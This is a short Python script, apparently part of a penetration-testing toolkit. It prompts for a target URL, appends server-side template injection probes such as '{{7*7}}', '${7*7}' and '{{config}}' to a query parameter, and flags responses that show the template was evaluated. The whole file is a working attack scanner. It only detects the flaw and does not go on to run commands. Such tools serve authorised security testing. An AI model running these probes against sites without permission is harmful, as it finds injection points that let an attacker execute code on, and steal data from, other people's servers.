import requests
from rich.console import Console
from rich.prompt import Prompt
import sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
import config

console = Console()

PROBES = [
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("#{7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("{{7*'7'}}", "7777777"),
    ("${{7*7}}", "49"),
    ("{{config}}", "Config"),
    ("{{self}}", "TemplateReference"),
]


def run():
    url = Prompt.ask("url (with param, e.g. http://t/?name=)")
    timeout = float(Prompt.ask("timeout (s)", default="5.0"))

    console.print(f"[cyan]testing {len(PROBES)} SSTI probes[/cyan]")
    for payload, expected in PROBES:
        try:
            r = requests.get(url + payload, timeout=timeout,
                             headers={"User-Agent": config.USER_AGENT})
            if expected in r.text:
                console.print(f"[green][HIT] {payload} -> found '{expected}'[/green]")
            else:
                console.print(f"[yellow][OK] {payload} -> HTTP {r.status_code}[/yellow]")
        except requests.RequestException as e:
            console.print(f"[red][FAIL] {payload} -> {e}[/red]")
